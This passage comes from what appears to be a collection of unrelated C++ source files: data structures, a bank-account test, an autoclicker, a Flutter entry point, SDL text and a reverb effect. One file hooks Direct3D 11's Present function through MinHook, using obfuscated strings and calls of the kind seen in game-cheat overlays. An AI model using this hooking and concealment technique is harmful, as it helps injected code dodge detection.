WM_KEYDOWN, VK_SPACE, 0);\n\tPostMessage(Clicker::GetWindowHandle(), WM_KEYUP, VK_SPACE, 0);\n}\n\nvoid LeftMouseClicker::PressingKeyUntilHotKeyIsInputed(bool& is_enable) const{\n\tBeep(1000, 800);\n\tis_enable = true;\n\twhile (is_enable) {\n\t\tClickInsideApplication();\n\t\tSleep(Clicker::GetDelay());\n\t}\n}\n\nvoid RightMouseClicker::PressingKeyUntilHotKeyIsInputed(bool& is_enable) const{\n\tBeep(1500, 800);\n\tis_enable = true;\n\twhile (is_enable) {\n\t\tClickInsideApplication();\n\t\tSleep(Clicker::GetDelay());\n\t}\n}\n\nvoid SpaceButtonClicker::PressingKeyUntilHotKeyIsInputed(bool& is_enable) const{\n\tBeep(2000, 800);\n\tis_enable = true;\n\twhile (is_enable) {\n\t\tClickInsideApplication();\n\t\tSleep(Clicker::GetDelay());\n\t}\n}\n",
    "#include \"tree.h\"\n#include <iostream>\n\nBinarySearchTree::BinarySearchTree() {\n    root = nullptr;\n}\n\nBinarySearchTree::~BinarySearchTree() {\n    deleteTree(root);\n}\n\nvoid BinarySearchTree::insert(int key) {\n    root = insertRecursive(root, key);\n}\n\nNode* BinarySearchTree::insertRecursive(Node* node, int key) {\n    if (node == nullptr) {\n        Node* newNode = new Node();\n        newNode->key = key;\n        newNode->left = nullptr;\n        newNode->right = nullptr;\n        return newNode;\n    }\n\n    if (key < node->key) {\n        node->left = insertRecursive(node->left, key);\n    } else if (key > node->key) {\n        node->right = insertRecursive(node->right, key);\n    }\n\n    return node;\n}\n\nbool BinarySearchTree::search(int key) {\n    return searchRecursive(root, key);\n}\n\nbool BinarySearchTree::searchRecursive(Node* node, int key) {\n    if (node == nullptr) {\n        return false;\n    }\n\n    if (key == node->key) {\n        return true;\n    } else if (key < node->key) {\n        return searchRecursive(node->left, key);\n    } else {\n        return searchRecursive(node->right, key);\n    }\n}\n\nvoid BinarySearchTree::remove(int key) {\n    root = removeRecursive(root, key);\n}\n\nNode* BinarySearchTree::removeRecursive(Node* node, int key) {\n    if (node == nullptr) {\n        return nullptr;\n    }\n\n    if (key < node->key) {\n        node->left = removeRecursive(node->left, key);\n    } else if (key > node->key) {\n        node->right = removeRecursive(node->right, key);\n    } else {\n        if (node->left == nullptr && node->right == nullptr) {\n            delete node;\n            return nullptr;\n        } else if (node->left == nullptr) {\n            Node* temp = node->right;\n            delete node;\n            return temp;\n        } else if (node->right == nullptr) {\n            Node* temp = node->left;\n            delete node;\n            return temp;\n        } else {\n            Node* temp = findMin(node->right);\n            node->key = temp->key;\n            node->right = removeRecursive(node->right, temp->key);\n        }\n    }\n\n    return node;\n}\n\nNode* BinarySearchTree::findMin(Node* node) {\n    while (node->left != nullptr) {\n        node = node->left;\n    }\n    return node;\n}\n\nvoid BinarySearchTree::inorderTraversal() {\n    inorderTraversalRecursive(root);\n    std::cout << std::endl;\n}\n\nvoid BinarySearchTree::inorderTraversalRecursive(Node* node) {\n    if (node != nullptr) {\n        inorderTraversalRecursive(node->left);\n        std::cout << node->key << \" \";\n        inorderTraversalRecursive(node->right);\n    }\n}\n\nvoid BinarySearchTree::preorderTraversal() {\n    preorderTraversalRecursive(root);\n    std::cout << std::endl;\n}\n\nvoid BinarySearchTree::preorderTraversalRecursive(Node* node) {\n    if (node != nullptr) {\n        std::cout << node->key << \" \";\n        preorderTraversalRecursive(node->left);\n        preorderTraversalRecursive(node->right);\n    }\n}\n\nvoid BinarySearchTree::postorderTraversal() {\n    postorderTraversalRecursive(root);\n    std::cout << std::endl;\n}\n\nvoid BinarySearchTree::postorderTraversalRecursive(Node* node) {\n    if (node != nullptr) {\n        postorderTraversalRecursive(node->left);\n        postorderTraversalRecursive(node->right);\n        std::cout << node->key << \" \";\n    }\n}\n\nvoid BinarySearchTree::deleteTree(Node* node) {\n    if (node != nullptr) {\n        deleteTree(node->left);\n        deleteTree(node->right);\n        delete node;\n    }\n}\n",
    "// ************************************************************************** //\n//                                                                            //\n//                tests.cpp for GlobalBanksters United                        //\n//                Created on  : Thu Nov 20 23:45:02 1989                      //\n//                Last update : Wed Jan 04 09:23:52 1992                      //\n//                Made by : Brad \"Buddy\" McLane <bm@gbu.com>                  //\n//                                                                            //\n// ************************************************************************** //\n\n#include <vector>\n#include <algorithm>\n#include <functional>\n#include \"Account.hpp\"\n\n\nint\t\tmain( void ) {\n\n\ttypedef std::vector<Account::t>\t\t\t\t\t\t\t  accounts_t;\n\ttypedef std::vector<int>\t\t\t\t\t\t\t\t  ints_t;\n\ttypedef std::pair<accounts_t::iterator, ints_t::iterator> acc_int_t;\n\n\tint\tconst\t\t\t\tamounts[]\t= { 42, 54, 957, 432, 1234, 0, 754, 16576 };\n\tsize_t const\t\t\tamounts_size( sizeof(amounts) / sizeof(int) );\n\taccounts_t\t\t\t\taccounts( amounts, amounts + amounts_size );\n\taccounts_t::iterator\tacc_begin\t= accounts.begin();\n\taccounts_t::iterator\tacc_end\t\t= accounts.end();\n\n\tint\tconst\t\t\td[]\t\t\t= { 5, 765, 564, 2, 87, 23, 9, 20 };\n\tsize_t const\t\td_size( sizeof(d) / sizeof(int) );\n\tints_t\t\t\t\tdeposits( d, d + d_size );\n\tints_t::iterator\tdep_begin\t= deposits.begin();\n\tints_t::iterator\tdep_end\t\t= deposits.end();\n\n\tint\tconst\t\t\tw[]\t\t\t= { 321, 34, 657, 4, 76, 275, 657, 7654 };\n\tsize_t const\t\tw_size( sizeof(w) / sizeof(int) );\n\tints_t\t\t\t\twithdrawals( w, w + w_size );\n\tints_t::iterator\twit_begin\t= withdrawals.begin();\n\tints_t::iterator\twit_end\t\t= withdrawals.end();\n\n\tAccount::displayAccountsInfos();\n\tstd::for_each( acc_begin, acc_end, std::mem_fun_ref( &Account::displayStatus ) );\n\n\tfor ( acc_int_t it( acc_begin, dep_begin );\n\t\t  it.first != acc_end && it.second != dep_end;\n\t\t  ++(it.first), ++(it.second) ) {\n\n\t\t(*(it.first)).makeDeposit( *(it.second) );\n\t}\n\n\tAccount::displayAccountsInfos();\n\tstd::for_each( acc_begin, acc_end, std::mem_fun_ref( &Account::displayStatus ) );\n\n\tfor ( acc_int_t it( acc_begin, wit_begin );\n\t\t  it.first != acc_end && it.second != wit_end;\n\t\t  ++(it.first), ++(it.second) ) {\n\n\t\t(*(it.first)).makeWithdrawal( *(it.second) );\n\t}\n\n\tAccount::displayAccountsInfos();\n\tstd::for_each( acc_begin, acc_end, std::mem_fun_ref( &Account::displayStatus ) );\n\n\treturn 0;\n}\n\n\n// ************************************************************************** //\n// vim: set ts=4 sw=4 tw=80 noexpandtab:                                      //\n// -*- indent-tabs-mode:t;                                                   -*-\n// -*- mode: c++-mode;                                                       -*-\n// -*- fill-column: 75; comment-column: 75;                                  -*-\n// ************************************************************************** //\n",
    "#include <iostream>\r\n#include <fstream>\r\n#include <sstream>\r\n#include <unordered_map>\r\n#include <unordered_set>\r\n#include <vector>\r\n#include <string>\r\n#include <algorithm>\r\n#include <ctime>\r\n\r\nusing namespace std;\r\n\r\nvector<string> tokenize(const string& str) {\r\n    vector<string> tokens;\r\n    stringstream ss(str);\r\n    string token;\r\n    while (ss >> token) {\r\n        tokens.push_back(token);\r\n    }\r\n    return tokens;\r\n}\r\n\r\nunordered_map<string, unordered_set<int>> build_inverted_index(const vector<string>& files) {\r\n    unordered_map<string, unordered_set<int>> invertedIndex;\r\n\r\n    const int size = files.size();\r\n\r\n    for (int i = 0; i < size; i++) {\r\n        ifstream inFile(files[i]);\r\n        if (!inFile.is_open()) {\r\n            cerr << \"Failed to open file: \" << files[i] << endl;\r\n            continue;\r\n        }\r\n\r\n        string word;\r\n        while (inFile >> word) {\r\n            invertedIndex[word].insert(i + 1);\r\n        }\r\n\r\n        inFile.close();\r\n        std::cout << \"Archivo \" << to_string(i + 1) << \" procesado exitosamente\\n\";\r\n    }\r\n\r\n    return invertedIndex;\r\n}\r\n\r\n// Function to search the inverted index\r\nvoid search(const unordered_map<string, unordered_set<int>>& invertedIndex, const string& query) {\r\n    auto it = invertedIndex.find(query);\r\n    if (it != invertedIndex.end()) {\r\n        cout << \"Documentos que contienen \\\"\" << query << \"\\\":\" << endl;\r\n        for (const auto& doc : it->second) {\r\n            cout << \" - \" << doc << endl;\r\n        }\r\n    } else {\r\n        cout << \"Ningun documento tiene la palabra \\\"\" << query << \"\\\"\" << endl;\r\n    }\r\n}\r\n\r\nint main() {\r\n    vector<string> files; // Add your file names here\r\n    for (int i = 0; i < 10; i++)\r\n    {\r\n        files.push_back(\"zdoc\" + to_string(i + 1) + \".txt\");\r\n    }\r\n    std::clock_t start = std::clock();\r\n    unordered_map<string, unordered_set<int>> invertedIndex = build_inverted_index(files);\r\n    std::clock_t end = std::clock();\r\n    std::cout << \"Word count completed in \" << (end - start) / (double)CLOCKS_PER_SEC << \" seconds\\n\";\r\n    string query;\r\n    cout << \"Enter a word to search for in the documents: \";\r\n    while (cin >> query)\r\n    {\r\n        search(invertedIndex, query);\r\n    }\r\n\r\n    return 0;\r\n}",
    "#include \"d3d_Hook.hpp\"\r\n\r\n#include <MinHook.h>\r\n\r\nbool Hook::Init()\r\n{\r\n\tconst std::string Title = E(\"SKYPE TERMINAL CALLING\");\r\n\r\n\tWNDCLASSEX Window;\r\n\r\n\tWindow.cbSize = sizeof(WNDCLASSEX);\r\n\tWindow.style = CS_HREDRAW | CS_VREDRAW;\r\n\r\n\tWindow.lpfnWndProc = DefWindowProcA;\r\n\tWindow.cbClsExtra = NULL;\r\n\tWindow.cbWndExtra = NULL;\r\n\tWindow.hInstance = SAFE_CALL(GetModuleHandleA)(nullptr);\r\n\tWindow.hIcon = NULL;\r\n\tWindow.hCursor = NULL;\r\n\tWindow.hbrBackground = NULL;\r\n\tWindow.lpszMenuName = NULL;\r\n\tWindow.lpszClassName = Title.c_str();\r\n\tWindow.hIconSm = NULL;\r\n\r\n\tSAFE_CALL(RegisterClassExA)(&Window);\r\n\r\n\tHWND WindowA = CreateWindowA(Window.lpszClassName, Title.c_str(), WS_OVERLAPPEDWINDOW, 0, 0, 100, 100, 0, 0, Window.hInstance, 0);\r\n\r\n\tHMODULE D3D11_DLL;\r\n\tif ((D3D11_DLL = SAFE_CALL(GetModuleHandleA)(E(\"d3d11.dll\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tvoid* D3D11CreateDeviceAndSwapChain;\r\n\r\n\tif ((D3D11CreateDeviceAndSwapChain = SAFE_CALL(GetProcAddress)(D3D11_DLL, E(\"D3D11CreateDeviceAndSwapChain\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tD3D_FEATURE_LEVEL featureLevel;\r\n\tconst D3D_FEATURE_LEVEL featureLevels[] = { D3D_FEATURE_LEVEL_10_1, D3D_FEATURE_LEVEL_11_0 };\r\n\tDXGI_RATIONAL refreshRate;\r\n\trefreshRate.Numerator = 60;\r\n\trefreshRate.Denominator = 1;\r\n\r\n\tDXGI_MODE_DESC bufferDesc;\r\n\tbufferDesc.Width = 100;\r\n\tbufferDesc.Height = 100;\r\n\tbufferDesc.RefreshRate = refreshRate;\r\n\tbufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;\r\n\tbufferDesc.ScanlineOrdering = DXGI_MODE_SCANLINE_ORDER_UNSPECIFIED;\r\n\tbufferDesc.Scaling = DXGI_MODE_SCALING_UNSPECIFIED;\r\n\r\n\tDXGI_SAMPLE_DESC sampleDesc;\r\n\tsampleDesc.Count = 1;\r\n\tsampleDesc.Quality = 0;\r\n\r\n\tDXGI_SWAP_CHAIN_DESC swapChainDesc;\r\n\tswapChainDesc.BufferDesc = bufferDesc;\r\n\tswapChainDesc.SampleDesc = sampleDesc;\r\n\tswapChainDesc.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;\r\n\tswapChainDesc.BufferCount = 1;\r\n\tswapChainDesc.OutputWindow = WindowA;\r\n\tswapChainDesc.Windowed = 1;\r\n\tswapChainDesc.SwapEffect = DXGI_SWAP_EFFECT_DISCARD;\r\n\tswapChainDesc.Flags = DXGI_SWAP_CHAIN_FLAG_ALLOW_MODE_SWITCH;\r\n\r\n\tIDXGISwapChain* swapChain;\r\n\tID3D11Device* device;\r\n\tID3D11DeviceContext* context;\r\n\r\n\tif (((long(__stdcall*)(\r\n\t\tIDXGIAdapter*,\r\n\t\tD3D_DRIVER_TYPE,\r\n\t\tHMODULE,\r\n\t\tUINT,\r\n\t\tconst D3D_FEATURE_LEVEL*,\r\n\t\tUINT,\r\n\t\tUINT,\r\n\t\tconst DXGI_SWAP_CHAIN_DESC*,\r\n\t\tIDXGISwapChain**,\r\n\t\tID3D11Device**,\r\n\t\tD3D_FEATURE_LEVEL*,\r\n\t\tID3D11DeviceContext**))(D3D11CreateDeviceAndSwapChain))(0, D3D_DRIVER_TYPE_HARDWARE, 0, 0, featureLevels, 2, D3D11_SDK_VERSION, &swapChainDesc, &swapChain, &device, &featureLevel, &context) < 0)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tg_methodsTable = (uint64_t*)calloc(205, sizeof(uint64_t));\r\n\r\n\tmemcpy(g_methodsTable, *(uint64_t**)swapChain, 18 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18, *(uint64_t**)device, 43 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18 + 43, *(uint64_t**)context, 144 * sizeof(uint64_t));\r\n\r\n\tMH_Initialize();\r\n\r\n\tswapChain->Release();\r\n\tswapChain = 0;\r\n\r\n\tdevice->Release();\r\n\tdevice = 0;\r\n\r\n\tcontext->Release();\r\n\tcontext = 0;\r\n\r\n\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\treturn true;\r\n}\r\n\r\nbool Hook::Present(void** hk_originalFunction, void* hk_hookedPresent)\r\n{\r\n\tif (!hk_originalFunction || !hk_hookedPresent)\r\n\t\treturn false;\r\n\r\n\tvoid* target = (void*)g_methodsTable[8];\r\n\r\n\tif (!target)\r\n\t\treturn false;\r\n\r\n\tif (MH_CreateHook(target, hk_hookedPresent, hk_originalFunction) != MH_OK || MH_EnableHook(target) != MH_OK)\r\n\t{\r\n\t\treturn false;\r\n\t}\r\n\r\n\treturn true;\r\n}",
    "#include\"Variant.hpp\"\n#include\"Logger.hpp\"\n#include\"variant_to_string.hpp\"\n#include\"FunctionMacro.hpp\"\n\nFunction_Begin(get_type_name,String const)\nParameter(Variant,any)\n    if(any.is_null()){\n        return \"null\";\n    }else if(any.is_boolean()){\n        return \"boolean\";\n    }else if(any.is_number()){\n        return \"number\";\n    }else if(any.is_string()){\n        return \"string\";\n    }else if(any.is_array()){\n        return \"array\";\n    }else if(any.is_object()){\n        return \"object\";\n    }else if(any.is_function()){\n        return \"function\";\n    }\n    return \"undefined\";\nFunction_End\n\nauto lambda_get_type_name=\n    Lambda_Begin(String const)\n    Parameter(Variant const,any)\n        return ::get_type_name(any);\n    Lambda_End;\n\nint main(int argc,char* argv[]){\n    static_assert(sizeof(Variant)<=sizeof(void*));\n    Variant variant=Object{\n        {\"null\",Null{}},\n        {\"boolean\",true},\n        {\"integer\",-1},\n        {\"float\",3.14},\n        {\"character\",'A'},\n        {\"string\",\"hello\"},\n        {\"array\",\n            Array{\n                Null{},false,1,-3.14,'B',\"world\",\n                Array{1,2},Object{{\"name\",\"Tom\"},{\"age\",20}},\n                Lambda_Begin(Null)\n                Parameter(Number const,num1)\n                Parameter(Number const,num2)\n                    ::std::cout<<num1<<num2<<\"\\n\";\n                Lambda_End\n            },\n        },\n        {\"set_value\",\n            Lambda_Begin(Null,&variant)\n            Parameter(String const,name)\n            Parameter(Number const,age)\n                variant.object()[\"name\"]=name;\n                variant.object()[\"age\"]=age;\n            Lambda_End\n        }\n    };\n    variant.object()[\"set_value\"].function().Invoke(\"Jerry\",114514);\n    Logger::info(variant_to_string(variant));\n    BoxManager<typename Variant::value_type>::print_object_pool();\n    BoxManager<typename Variant::value_type>::print_memory_pool();\n    return 0;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"quiz\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"test.h\"\r\n\r\nusing namespace std;\r\n\r\nvoid Text::init(SDL_Renderer* renderer)\r\n{\r\n    font = TTF_OpenFont(\"minecraft.ttf\", 20);\r\n\r\n    surface = TTF_RenderText_Solid(font, \"Casual\", color);\r\n    casual = SDL_CreateTextureFromSurface(renderer, surface);\r\n    SDL_FreeSurface(surface);\r\n    SDL_QueryTexture(casual, NULL, NULL, &casualRect.w, &casualRect.h);\r\n    casualRect.x = 1182;\r\n    casualRect.y = 75;\r\n\r\n    surface = TTF_RenderText_Solid(font, \"Versus\", color);\r\n    versus = SDL_CreateTextureFromSurface(renderer, surface);\r\n    SDL_FreeSurface(surface);\r\n    SDL_QueryTexture(versus, NULL, NULL, &versusRect.w, &versusRect.h);\r\n    versusRect.x = 1183;\r\n    versusRect.y = 95;\r\n\r\n    surface = TTF_RenderText_Solid(font, \"Help\", color);\r\n    help = SDL_CreateTextureFromSurface(renderer, surface);\r\n    SDL_FreeSurface(surface);\r\n    SDL_QueryTexture(help, NULL, NULL, &helpRect.w, &helpRect.h);\r\n    helpRect.x = 1210;\r\n    helpRect.y = 115;\r\n\r\n    surface = TTF_RenderText_Solid(font, \"Quit\", color);\r\n    quit = SDL_CreateTextureFromSurface(renderer, surface);\r\n    SDL_FreeSurface(surface);\r\n    SDL_QueryTexture(quit, NULL, NULL, &quitRect.w, &quitRect.h);\r\n    quitRect.x = 1211;\r\n    quitRect.y = 135;\r\n\r\n    surface = TTF_RenderText_Solid(font, \"Use [W], [Arrows], [Space], [Enter] to navigate and play the game\", color);\r\n    helper = SDL_CreateTextureFromSurface(renderer, surface);\r\n    SDL_FreeSurface(surface);\r\n    SDL_QueryTexture(helper, NULL, NULL, &helperRect.w, &helperRect.h);\r\n    helperRect.x = 20;\r\n    helperRect.y = 105;\r\n}\r\n\r\nvoid Text::display(SDL_Renderer* renderer)\r\n{\r\n    SDL_RenderCopy(renderer, casual, NULL, &casualRect);\r\n    SDL_RenderCopy(renderer, versus, NULL, &versusRect);\r\n    SDL_RenderCopy(renderer, help, NULL, &helpRect);\r\n    SDL_RenderCopy(renderer, quit, NULL, &quitRect);\r\n}\r\n\r\nvoid Text::helperDisplay(SDL_Renderer* renderer)\r\n{\r\n    SDL_RenderCopy(renderer, helper, NULL, &helperRect);\r\n}\r\n\r\nvoid Text::destroy()\r\n{\r\n    TTF_CloseFont(font);\r\n    SDL_DestroyTexture(casual);\r\n}",
    "\ufeff#define _CRT_SECURE_NO_WARNINGS\n#include <iostream>\nusing namespace std;\n\nstruct Node {\n\tint dinhke;\n\tint trongso;\n\tNode* link;\n};\n\nconst int MAX = 20;\n\nstruct DanhSachKe {\n\tNode* dsk[MAX];\n\tint sodinh;\n};\n\nbool docDanhSachKe(const char* textFile, DanhSachKe& ds) {\n\tFILE* f = fopen(textFile, \"rt\");\n\tif (f == NULL) return false;\n\t//Khoi tao ds ke\n\tfor (int i = 0; i < MAX; i++)\n\t\tds.dsk[i] = NULL;\n\n\t//Doc so dinh cua danh sach ke\n\tfscanf(f, \"%d\", &ds.sodinh);\n\n\t//Doc danh sach ke\n\tfor (int i = 0; i < ds.sodinh; i++) {\n\t\tint sodinhke;\n\t\tfscanf(f, \"%d\", &sodinhke);\n\n\t\tfor (int j = 0; j < sodinhke; j++) {\n\t\t\t//Tao 1 con tro chua dinh ke doc tu file\n\t\t\tNode* p = new Node;\n\t\t\tfscanf(f, \"%d%d\", &p->dinhke, &p->trongso);\n\t\t\tp->link = NULL;\n\n\t\t\tif (ds.dsk[i] == NULL)\n\t\t\t\tds.dsk[i] = p;\n\t\t\telse {\n\t\t\t\tNode* temp = ds.dsk[i];\n\t\t\t\twhile (temp->link != NULL)\n\t\t\t\t\ttemp = temp->link;\n\t\t\t\ttemp->link = p;\n\t\t\t}\n\t\t}\n\t}\n}\n\nvoid xuatDanhSachKe(DanhSachKe ds) {\n\tfor (int i = 0; i < ds.sodinh; i++) {\n\t\tcout << \"(\" << i << \"): \";\n\t\tNode* p = ds.dsk[i];\n\t\twhile (p != NULL) {\n\t\t\tcout << \"(\" << p->dinhke << \",\" << p->trongso << \") \";\n\t\t\tp = p->link;\n\t\t}\n\t\tcout << endl;\n\t}\n}\n\nint tinhBacRa(DanhSachKe ds, int u) {\n\tint count = 0;\n\tNode* p = ds.dsk[u];\n\twhile (p != NULL) {\n\t\tcount++;\n\t\tp = p->link;\n\t}\n\treturn count;\n}\n\nint tinhBacVao(DanhSachKe ds, int u) {\n\tint count = 0;\n\tfor (int i = 0; i < ds.sodinh; i++) {\n\t\tNode* p = ds.dsk[i];\n\t\twhile (p != NULL) {\n\t\t\tif (p->dinhke == u) {\n\t\t\t\tcount++;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tp = p->link;\n\t\t}\n\t}\n\treturn count;\n}\n\n//v l\u00e0 \u0111\u1ec9nh, u l\u00e0 \u0111\u1ec9nh k\u1ec1\nvoid trongSoLonNhat(DanhSachKe ds, int& v, int& u) {\n\tNode* max = NULL;\n\tfor (int i = 0; i < ds.sodinh; i++) {\n\t\tNode* p = ds.dsk[i];\n\t\twhile (p != NULL) {\n\t\t\tif (max == NULL)\n\t\t\t\tmax = p;\n\t\t\telse if (p->trongso > max->trongso) {\n\t\t\t\tmax = p;\n\t\t\t\tv = i;\n\t\t\t}\n\t\t\tp = p->link;\n\t\t}\n\t}\n\tif(max!=NULL)\n\t\tu = max->dinhke;\n}\n\nint main() {\n\tDanhSachKe danhSach;\n\tif (docDanhSachKe(\"TextDanhSachKe.txt\", danhSach)) {\n\t\tcout << \"Danh Sach Ke:\" << endl;\n\t\txuatDanhSachKe(danhSach);\n\t\tcout << endl;\n\t}\n\telse {\n\t\tcout << \"Failed to open file!\" << endl;\n\t}\n\n\tint ra, vao;\n\tcout << \"Nhap dinh muon tinh so bac ra: \"; cin >> ra;\n\tcout << \"Bac ra cua dinh \" << ra << \": \" << tinhBacRa(danhSach, ra);\n\tcout << \"\\nNhap dinh muon tinh so bac vao: \"; cin >> vao;\n\tcout << \"Bac vao cua dinh \" << vao << \": \" << tinhBacVao(danhSach, vao);\n\n\tint v, u;\n\ttrongSoLonNhat(danhSach, v, u);\n\tcout << \"\\nDinh co trong so lon nhat: (\" << v << \",\" << u << \")\";\n\tcout << endl << endl;\n\treturn 0;\n}",
    "#include \"daisysp.h\"\n#include \"daisy_seed.h\"\n\n// Interleaved audio definitions\n#define LEFT (i)\n#define RIGHT (i + 1)\n\nusing namespace daisysp;\nusing namespace daisy;\n\nstatic DaisySeed hw;\n\n// Number of delay lines\n#define DEL_NUM 4U\n\n// Declare FDN DelayLines\nstatic DelayLine<float, 4999U + 1U> FDN_del_L[DEL_NUM];\nstatic DelayLine<float, 4999U + 1U> FDN_del_R[DEL_NUM];\n\n// Declare LPF DelayLines\nstatic DelayLine<float, 1U> lpf_del_L[DEL_NUM];\nstatic DelayLine<float, 1U> lpf_del_R[DEL_NUM];\n\n// Declare APF DelayLines\nstatic DelayLine<float, 557U + 1U> apf_del[DEL_NUM];\n\nconst signed char hadamard_matrix[DEL_NUM][DEL_NUM] = {\n{  1,  1,  1,  1  },\n{ -1,  1, -1,  1  },\n{ -1, -1,  1,  1  },\n{  1, -1, -1,  1  }\n};\n\n// Matrix scalar for Hadamard\n#define MATRIX_SCALAR 0.5f\n\n// Number of primes\n#define PRIMES_NUM 669\n\nconst unsigned short primes[PRIMES_NUM] = {\n2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,73,79,83,89,97,101,103,107,109,113,127,131,137,139,149,151,157,163,167,173,179,181,191,193,197,199,211,223,227,229,233,239,241,251,257,263,269,271,277,281,283,293,307,311,313,317,331,337,347,349,353,359,367,373,379,383,389,397,401,409,419,421,431,433,439,443,449,457,461,463,467,479,487,491,499,503,509,521,523,541,547,557,563,569,571,577,587,593,599,601,607,613,617,619,631,641,643,647,653,659,661,673,677,683,691,701,709,719,727,733,739,743,751,757,761,769,773,787,797,809,811,821,823,827,829,839,853,857,859,863,877,881,883,887,907,911,919,929,937,941,947,953,967,971,977,983,991,\n997,1009,1013,1019,1021,1031,1033,1039,1049,1051,1061,1063,1069,1087,1091,1093,1097,1103,1109,1117,1123,1129,1151,1153,1163,1171,1181,1187,1193,1201,1213,1217,1223,1229,1231,1237,1249,1259,1277,1279,1283,1289,1291,1297,1301,1303,1307,1319,1321,1327,1361,1367,1373,1381,1399,1409,1423,1427,1429,1433,1439,1447,1451,1453,1459,1471,1481,1483,1487,1489,1493,1499,1511,1523,1531,1543,1549,1553,1559,1567,1571,1579,1583,1597,1601,1607,1609,1613,1619,1621,1627,1637,1657,1663,1667,1669,1693,1697,1699,1709,1721,1723,1733,1741,1747,1753,1759,1777,1783,1787,1789,1801,1811,1823,1831,1847,1861,1867,1871,1873,1877,1879,1889,1901,1907,1913,1931,1933,\n1949,1951,1973,1979,1987,1993,1997,1999,2003,2011,2017,2027,2029,2039,2053,2063,2069,2081,2083,2087,2089,2099,2111,2113,2129,2131,2137,2141,2143,2153,2161,2179,2203,2207,2213,2221,2237,2239,2243,2251,2267,2269,2273,2281,2287,2293,2297,2309,2311,2333,2339,2341,2347,2351,2357,2371,2377,2381,2383,2389,2393,2399,2411,2417,2423,2437,2441,2447,2459,2467,2473,2477,2503,2521,2531,2539,2543,2549,2551,2557,2579,2591,2593,2609,2617,2621,2633,2647,2657,2659,2663,2671,2677,2683,2687,2689,2693,2699,2707,2711,2713,2719,2729,2731,2741,2749,2753,2767,2777,2789,2791,2797,2801,2803,2819,2833,2837,2843,2851,2857,2861,2879,2887,2897,2903,2909,2917,2927,\n2939,2953,2957,2963,2969,2971,2999,3001,3011,3019,3023,3037,3041,3049,3061,3067,3079,3083,3089,3109,3119,3121,3137,3163,3167,3169,3181,3187,3191,3203,3209,3217,3221,3229,3251,3253,3257,3259,3271,3299,3301,3307,3313,3319,3323,3329,3331,3343,3347,3359,3361,3371,3373,3389,3391,3407,3413,3433,3449,3457,3461,3463,3467,3469,3491,3499,3511,3517,3527,3529,3533,3539,3541,3547,3557,3559,3571,3581,3583,3593,3607,3613,3617,3623,3631,3637,3643,3659,3671,3673,3677,3691,3697,3701,3709,3719,3727,3733,3739,3761,3767,3769,3779,3793,3797,3803,3821,3823,3833,3847,3851,3853,3863,3877,3881,3889,3907,3911,3917,3919,3923,3929,3931,3943,3947,3967,3989,4001,\n4003,4007,4013,4019,4021,4027,4049,4051,4057,4073,4079,4091,4093,4099,4111,4127,4129,4133,4139,4153,4157,4159,4177,4201,4211,4217,4219,4229,4231,4241,4243,4253,4259,4261,4271,4273,4283,4289,4297,4327,4337,4339,4349,4357,4363,4373,4391,4397,4409,4421,4423,4441,4447,4451,4457,4463,4481,4483,4493,4507,4513,4517,4519,4523,4547,4549,4561,4567,4583,4591,4597,4603,4621,4637,4639,4643,4649,4651,4657,4663,4673,4679,4691,4703,4721,4723,4729,4733,4751,4759,4783,4787,4789,4793,4799,4801,4813,4817,4831,4861,4871,4877,4889,4903,4909,4919,4931,4933,4937,4943,4951,4957,4967,4969,4973,4987,4993,4999\n};\n\nunsigned int selectedPrimes[DEL_NUM];\n\n// G gains\n//float g[DEL_NUM] = {0.805f, 0.827f, 0.783f, 0.764f};\n\nfloat u, sig_out_L, sig_out_R;\nfloat lpf_y_L[DEL_NUM], lpf_y_R[DEL_NUM];\nfloat apf_del_out, apf_feedback, apf_y; //[DEL_NUM];\nfloat FDN_del_out_L[DEL_NUM], FDN_del_out_R[DEL_NUM]; // delay outs\nfloat FDN_feedback_L, FDN_feedback_R;\nunsigned char idx, r, c; // for-loop variables\n\n// Potentiometer Controls\nfloat wetCV;\nfloat lengthCV;\nfloat densityCV;\nfloat feedbackGainCV;\n\n\nstatic void AudioCallback(AudioHandle::InterleavingInputBuffer  in,\n                          